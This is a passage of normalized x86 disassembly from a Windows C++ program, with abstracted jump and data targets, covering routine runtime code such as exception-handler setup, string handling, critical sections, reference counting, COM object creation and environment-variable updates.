mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0xc
sub_413450
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
push esi
mov esi [ esp + 0x8 ]
cmp esi 0xffffffff
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov edx [ eax + 0x8 ]
mov [ rw-data ] edx
mov eax [ eax + 0xc ]
mov [ rw-data ] eax
mov esi [ rw-data ]
cmp esi [ rw-data ]
jae r-xdata
test esi esi
mov [ ecx + 0x2c ] esi
je r-xdata
xor eax eax
pop esi
retn 0xc
lea ecx [ ecx ]
cmp [ esi ] 0x0
je r-xdata
mov eax [ rw-data ]
add esi 0x4
cmp esi eax
jb r-xdata
push 0x1
call [ eax + 0x20 ]
push 0x1
call [ esi + 0x20 ]
mov eax [ esi + 0x24 ]
add esi 0x24
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
sub_4134d0
push esi
push edi
mov edi ecx
mov esi [ edi + 0x2c ]
test esi esi
je r-xdata
mov esi [ rw-data ]
cmp esi [ rw-data ]
jae r-xdata
cmp [ esi ] 0x0
je r-xdata
mov eax [ edi + 0x4 ]
test eax eax
lea esi [ edi + 0x4 ]
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
pop edi
pop esi
retn
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
mov eax [ rw-data ]
add esi 0x4
cmp esi eax
jb r-xdata
push 0x0
call [ eax + 0x20 ]
push 0x0
mov [ esi + 0x10 ] 0x0
call [ esi + 0x20 ]
mov eax [ esi + 0x24 ]
add esi 0x24
test eax eax
jne r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
push esi
call [ Ordinal_ATL71_64@IAT ]
mov [ edi + 0xc ] 0x0
add edi 0x10
push edi
call [ DeleteCriticalSection@IAT ]
mov [ esi ] 0x0
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
sub_413580
push 0xffffffff
push sub_430ee0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ esp + 0xc ] 0xffffffff
call sub_413110
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_413620
push 0x1
call [ _set_new_mode@IAT ]
push sub_4135d0
call [ _set_se_translator@IAT ]
push 0x1
call [ _set_error_mode@IAT ]
add esp 0xc
push 0x3
call [ SetErrorMode@IAT ]
push sub_4135c0
call [ SetUnhandledExceptionFilter@IAT ]
push sub_4135e0
call [ set_terminate@IAT ]
push sub_4135f0
call [ set_unexpected@IAT ]
push sub_413600
call [ _set_purecall_handler@IAT ]
push sub_413610
call [ _set_new_handler@IAT ]
add esp 0x10
mov [ 0x0 ] 0x1
retn
sub_413690
push 0xffffffff
push sub_430f05
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esp + 0x10 ] 0x0
lea ecx [ esi + 0x1c ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x10 ] 0xffffffff
mov ecx esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4136e0
push 0xffffffff
push sub_430f25
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esp + 0x10 ] 0x0
lea ecx [ esi + 0x1c ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x10 ] 0xffffffff
mov ecx esi
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_413730
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_430f48
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax 0x10044
call sub_42e910
mov eax [ rw-data ]
push edi
mov [ esp + 0x10044 ] eax
xor eax eax
mov [ esp + 0x40 ] 0x0
mov ecx 0x3fff
lea edi [ esp + 0x42 ]
[ edi ]
push 0x7fff
lea eax [ esp + 0x44 ]
push eax
push r--data
call [ GetEnvironmentVariableW@IAT ]
lea ecx [ esp + 0x40 ]
push ecx
lea ecx [ esp + 0x28 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x10054 ] 0x0
push r--data
lea ecx [ esp + 0x28 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::append@IAT ]
lea edx [ esp + 0x8 ]
push edx
call sub_428b50
add esp 0x4
mov [ esp + 0x10054 ] 0x1
push eax
lea ecx [ esp + 0x28 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::append@IAT ]
mov [ esp + 0x10054 ] 0x0
lea ecx [ esp + 0x8 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
lea ecx [ esp + 0x24 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
push eax
push r--data
call [ SetEnvironmentVariableW@IAT ]
mov [ esp + 0x10054 ] 0xffffffff
lea ecx [ esp + 0x24 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov ecx [ esp + 0x1004c ]
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x10044 ]
call sub_42e72f
pop edi
mov esp ebp
pop ebp
retn
sub_413910
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
mov eax esi
pop esi
retn 0x4
push eax
call [ InterlockedIncrement@IAT ]
sub_4139c0
push 0xffffffff
push sub_430f71
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov ecx [ esp + 0x14 ]
mov [ esp ] ecx
mov [ esp + 0xc ] 0x0
test ecx ecx
je r-xdata
mov [ esp + 0xc ] 0xffffffff
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esp + 0x18 ]
mov edx [ eax ]
mov [ ecx ] edx
mov eax [ eax + 0x4 ]
test eax eax
mov [ ecx + 0x4 ] eax
je r-xdata
push eax
call [ InterlockedIncrement@IAT ]
sub_413ab0
mov eax [ esp + 0x4 ]
test eax eax
jl r-xdata
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp eax [ ecx + 0x4 ]
jge r-xdata
mov ecx [ ecx ]
lea eax [ ecx + eax * 4 ]
retn 0x4
sub_413b00
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
push edi
mov edi [ free@IAT ]
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
add esp 0x4
mov [ esi ] 0x0
pop edi
mov [ esi + 0x8 ] 0x0
pop esi
retn
push eax
call edi
add esp 0x4
mov [ esi + 0x4 ] 0x0
sub_413b40
push esi
mov esi ecx
mov eax [ esi ]
push edi
xor edi edi
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn
push eax
call [ free@IAT ]
add esp 0x4
mov [ esi ] edi
sub_413c80
mov edx [ esp + 0x4 ]
mov eax [ edx + 0x8 ]
push ebx
push esi
mov esi [ eax ]
mov [ edx + 0x8 ] esi
mov esi [ eax ]
mov bl [ esi + 0x19 ]
test bl bl
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x4 ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx ]
jne r-xdata
mov [ ecx + 0x4 ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx + 0x8 ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
sub_413cf0
mov edx [ esp + 0x4 ]
mov eax [ edx ]
push ebx
push esi
mov esi [ eax + 0x8 ]
mov [ edx ] esi
mov esi [ eax + 0x8 ]
mov bl [ esi + 0x19 ]
test bl bl
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x4 ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx + 0x8 ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
sub_413d90
mov eax [ ecx ]
mov dl [ eax + 0x19 ]
test dl dl
je r-xdata
mov edx [ eax ]
push ebx
mov bl [ edx + 0x19 ]
test bl bl
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ecx ] eax
retn
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x19 ]
test dl dl
jne r-xdata
mov eax [ edx + 0x8 ]
mov bl [ eax + 0x19 ]
test bl bl
jne r-xdata
pop ebx
retn
lea ecx [ ecx ]
mov [ ecx ] edx
pop ebx
retn
mov edx eax
mov eax [ edx + 0x8 ]
mov bl [ eax + 0x19 ]
test bl bl
je r-xdata
mov dl [ eax + 0x19 ]
test dl dl
jne r-xdata
mov [ ecx ] eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x19 ]
test dl dl
je r-xdata
mov [ ecx ] eax
mov edx [ ecx ]
cmp edx [ eax ]
jne r-xdata
sub_413e50
push ebx
push esi
mov esi ecx
push edi
mov edi [ esp + 0x10 ]
mov eax [ edi ]
mov [ esi + 0xb8 ] eax
mov ecx [ edi + 0x4 ]
mov [ esi + 0xbc ] ecx
mov edx [ edi + 0x8 ]
mov [ esi + 0xc0 ] edx
mov eax [ edi + 0xc ]
mov [ esi + 0xc4 ] eax
mov ecx [ edi + 0x10 ]
mov [ esi + 0xc8 ] ecx
mov edx [ edi + 0x14 ]
lea eax [ edi + 0x18 ]
push eax
lea ecx [ esi + 0xd0 ]
mov [ esi + 0xcc ] edx
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator=@IAT ]
add edi 0x34
push edi
lea ecx [ esi + 0xec ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator=@IAT ]
mov edx [ esi + 0xbc ]
mov edi [ esi + 0xb8 ]
lea ebx [ esi + 0x90 ]
xor eax eax
mov [ ebx ] eax
xor ecx ecx
mov [ ebx + 0x4 ] ecx
mov ecx [ esi + 0xcc ]
imul ecx ecx 0x3e8
mov [ ebx + 0x8 ] edx
mov [ ebx + 0xc ] edi
pop edi
mov [ esi + 0x3c ] ecx
pop esi
pop ebx
retn 0x4
sub_413f00
push esi
mov esi ecx
xor eax eax
lea ecx [ esi + 0x10 ]
mov edx ecx
mov [ edx ] eax
mov [ edx + 0x4 ] eax
mov [ edx + 0x8 ] eax
mov [ edx + 0xc ] eax
mov [ edx + 0x10 ] eax
mov [ edx + 0x14 ] eax
push edi
xor edi edi
mov [ esi + 0x4 ] 0x24
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] edi
mov [ rw-data ] esi
call sub_412ee0
test eax eax
mov eax esi
jge r-xdata
mov [ esi + 0x28 ] edi
pop edi
pop esi
retn
mov [ rw-data ] 0x1
sub_413f50
push 0xffffffff
push sub_430f88
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax ecx
mov [ esp ] eax
mov [ eax ] r--data
mov [ eax + 0x4 ] 0xd
mov [ esp + 0xc ] 0x0
mov ecx [ esp + 0x14 ]
mov [ eax ] r--data
mov [ eax + 0x8 ] ecx
mov [ esp + 0xc ] 0xffffffff
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_413fd0
push 0xffffffff
push sub_430fa8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ ecx ] r--data
mov [ esp + 0xc ] 0xffffffff
mov [ ecx ] r--data
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_414010
push esi
mov esi ecx
cmp [ esi ] 0x0
push edi
je r-xdata
mov eax [ esi + 0x2cc ]
test eax eax
mov edi [ CloseHandle@IAT ]
je r-xdata
push esi
call sub_41d590
mov ecx eax
call sub_41d210
mov eax [ esi + 0x8 ]
push eax
call edi
mov ecx [ esi + 0xc ]
push ecx
call edi
mov edx [ esi + 0x18 ]
push edx
call edi
mov eax [ esi + 0x1c ]
push eax
call edi
mov ecx [ esi + 0x10 ]
push ecx
call edi
mov edx [ esi + 0x14 ]
push edx
call edi
mov eax [ esi + 0x54 ]
push eax
call edi
mov eax [ esi + 0x58 ]
test eax eax
je r-xdata
push eax
call edi
mov [ esi + 0x2cc ] 0x0
pop edi
xor eax eax
pop esi
retn
push eax
call edi
mov [ esi + 0x58 ] 0x0
sub_414090
push esi
mov esi ecx
mov eax [ esi + 0x54 ]
push eax
call [ SetEvent@IAT ]
call sub_428850
test eax eax
jne r-xdata
mov ecx esi
call sub_414010
mov [ esi + 0x5c ] 0x0
xor eax eax
pop esi
retn
mov ecx [ esi + 0x58 ]
push 0xffffffff
push ecx
call [ WaitForSingleObject@IAT ]
sub_414110
push ebp
mov ebp esp
push 0xffffffff
push sub_430fcb
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x14
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x14 ] esi
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ecx esi
call sub_413450
mov edi eax
mov [ ebp - 0x18 ] edi
xor ebx ebx
cmp edi ebx
jl r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
call [ GetCurrentThreadId@IAT ]
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] ebx
mov [ ebp - 0x4 ] ebx
push 0xc
call sub_42e3bc
add esp 0x4
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0x1
cmp eax ebx
je r-xdata
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] bl
mov [ esi + 0x34 ] eax
jmp r-xdata
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] bl
mov [ esi + 0x34 ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi + 0x34 ] ebx
jne r-xdata
mov [ esi + 0x38 ] ebx
mov eax 0x8007000e
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4141f0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_430feb
push eax
mov eax [ esp + 0x10 ]
test eax eax
mov [ fs : 0x0 ] esp
push esi
mov esi ecx
mov [ esi ] eax
je r-xdata
mov [ esi + 0x4 ] 0x0
push 0x4
call sub_42e3bc
add esp 0x4
mov [ esp + 0x14 ] eax
mov [ esp + 0xc ] 0x0
test eax eax
je r-xdata
xor eax eax
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ esp + 0x4 ]
mov eax esi
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x4
push eax
call [ InterlockedIncrement@IAT ]
mov eax esi
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x4
mov [ esp + 0xc ] 0xffffffff
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
sub_414280
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
pop esi
retn
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
mov [ eax ] r--data
call ??3@YAXPAX@Z
add esp 0x4
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_414320
push 0xffffffff
push sub_431011
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
push r--data
lea ecx [ esp + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x4c ] 0x0
lea eax [ esp ]
push eax
lea ecx [ esp + 0x20 ]
call sub_403eb0
mov [ esp + 0x4c ] 0x1
mov [ esp + 0x1c ] r--data
mov [ esp + 0x4c ] 0x0
push r--data
lea ecx [ esp + 0x20 ]
push ecx
call _CxxThrowException
sub_4143a0
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
retn 0x4
cmp [ esi ] 0x0
je r-xdata
mov eax [ edi ]
mov [ esi ] eax
mov eax [ edi + 0x4 ]
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
call sub_414280
push eax
call [ InterlockedIncrement@IAT ]
sub_4143e0
mov eax [ esp + 0x4 ]
push edi
mov edi [ esp + 0xc ]
cmp eax edi
je r-xdata
mov eax [ esp + 0x10 ]
pop edi
retn
push ebp
mov ebp [ InterlockedDecrement@IAT ]
push esi
mov esi [ esp + 0x18 ]
lea ecx [ ecx ]
cmp edi [ esp + 0x10 ]
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
sub edi 0x8
sub esi 0x8
cmp esi edi
je r-xdata
mov eax esi
pop esi
pop ebp
pop edi
retn
mov eax [ edi ]
mov [ esi ] eax
mov eax [ edi + 0x4 ]
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call [ InterlockedIncrement@IAT ]
push eax
call ebp
test eax eax
jg r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
mov [ eax ] r--data
call ??3@YAXPAX@Z
add esp 0x4
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_4144a0
push 0xffffffff
push sub_431028
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
xor eax eax
push esi
mov esi ecx
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
mov [ esi + 0x4 ] 0x24
mov [ esi + 0xc ] eax
mov [ esi + 0x8 ] eax
lea ecx [ esi + 0x10 ]
mov [ esp + 0x4 ] esi
mov [ rw-data ] esi
call sub_412ee0
test eax eax
jge r-xdata
mov [ esi + 0x28 ] 0x0
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov [ rw-data ] 0x1
sub_414520
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
push edi
mov edi [ free@IAT ]
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
add esp 0x4
mov [ esi ] 0x0
pop edi
mov [ esi + 0x8 ] 0x0
pop esi
retn
push eax
call edi
add esp 0x4
mov [ esi + 0x4 ] 0x0
sub_414560
push esi
mov esi ecx
mov eax [ esi ]
push edi
xor edi edi
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
pop edi
pop esi
retn
push eax
call [ free@IAT ]
add esp 0x4
mov [ esi ] edi
sub_414590
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
mov eax esi
pop esi
retn 0x4
push eax
call [ InterlockedIncrement@IAT ]
sub_4145c0
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
pop esi
retn
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_414660
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
mov cl [ esp + 0xc ]
test cl cl
mov [ esi ] eax
mov [ esi + 0x4 ] 0x0
je r-xdata
mov eax esi
pop esi
retn 0x8
push eax
call [ EnterCriticalSection@IAT ]
mov [ esi + 0x4 ] 0x1
sub_414690
push 0xffffffff
push sub_431048
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call sub_4144a0
mov [ esp + 0x10 ] 0x0
mov [ esi ] r--data
mov [ rw-data ] esi
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_414710
push ebx
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ ecx + 0x28 ]
push esi
lea esi [ ecx + 0x28 ]
push edi
xor edi edi
test eax eax
jne r-xdata
mov eax 0x80004003
pop ebx
retn 0x4
mov eax [ esi ]
mov [ ebx ] eax
mov esi [ esi ]
mov ecx [ esi ]
push esi
call [ ecx + 0x4 ]
push esi
push r--data
push 0x1
push edi
push r--data
call [ CoCreateInstance@IAT ]
mov edi eax
test edi edi
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn 0x4
sub_4147c0
mov eax [ esp + 0x4 ]
push esi
mov esi [ ecx + 0x8 ]
add eax 0x8
push eax
lea ecx [ esi + 0x20 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator=@IAT ]
mov ecx [ esi + 0x1c ]
push ecx
call [ SetEvent@IAT ]
mov eax 0x1
pop esi
retn 0x4
sub_4147f0
push 0xffffffff
push sub_431068
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
call sub_414690
mov [ esp + 0x10 ] 0x0
mov [ esi ] r--data
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_414860
push 0xffffffff
push sub_4310af
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x168
mov eax [ esp + 0x17c ]
mov ecx [ esp + 0x180 ]
mov edx [ esp + 0x178 ]
push esi
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xc ] eax
mov [ esp + 0x4 ] ecx
mov [ esp + 0x10 ] edx
call sub_401aa0
add eax 0x240
push eax
call [ EnterCriticalSection@IAT ]
call sub_401aa0
add eax 0x1c
push eax
lea ecx [ esp + 0x18 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x174 ] 0x0
lea eax [ esp + 0x4c ]
push eax
call sub_427ea0
add esp 0x4
mov [ esp + 0x174 ] 0x1
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
lea ecx [ esp + 0x6c ]
mov esi eax
mov [ esp + 0x68 ] ecx
call [ rw-data ]
push eax
push esi
lea ecx [ esp + 0x70 ]
call sub_401de0
mov [ esp + 0x174 ] 0x2
mov edx [ esp + 0x68 ]
push edx
lea ecx [ esp + 0x34 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov esi eax
mov [ esp + 0x174 ] 0x3
call sub_401aa0
mov ecx [ esp + 0x190 ]
mov edx [ esp + 0x18c ]
mov eax [ eax + 0x21c ]
push ecx
mov ecx [ esp + 0x18c ]
push esi
push edx
push ecx
push eax
lea edx [ esp + 0x28 ]
push edx
call sub_40fb90
mov ecx eax
call sub_40f880
mov [ esp + 0x174 ] 0x2
lea ecx [ esp + 0x30 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x174 ] 0x1
mov eax [ esp + 0x68 ]
lea ecx [ esp + 0x6c ]
cmp eax ecx
pop esi
je r-xdata
mov [ esp + 0x170 ] 0x0
lea ecx [ esp + 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x170 ] 0xffffffff
lea ecx [ esp + 0x10 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
lea edx [ esp ]
push edx
call sub_40fb90
mov ecx eax
call sub_40f3b0
call sub_40fb90
mov ecx eax
call sub_40fef0
call sub_40fb90
mov ecx eax
call sub_40f980
call sub_401aa0
add eax 0x240
push eax
call [ LeaveCriticalSection@IAT ]
mov ecx [ esp + 0x168 ]
mov al 0x1
mov [ fs : 0x0 ] ecx
add esp 0x174
retn
push eax
call [ free@IAT ]
add esp 0x4
sub_414a10
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4310cb
push eax
mov [ fs : 0x0 ] esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
test eax eax
mov [ esi ] eax
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov [ esi + 0x4 ] 0x0
push 0x4
call sub_42e3bc
add esp 0x4
mov [ esp + 0x14 ] eax
mov [ esp + 0xc ] 0x0
test eax eax
je r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
xor eax eax
mov [ eax ] 0x0
jmp r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov ecx [ esp + 0x4 ]
mov eax esi
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x4
push eax
call [ InterlockedIncrement@IAT ]
mov eax esi
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x4
mov [ esp + 0xc ] 0xffffffff
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_414ae0
push 0xffffffff
push sub_4310e8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax ecx
mov ecx [ rw-data ]
add ecx 0x10
mov [ esp ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x0
mov [ esp + 0xc ] 0xffffffff
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_414b30
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
push edi
mov edi [ free@IAT ]
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
add esp 0x4
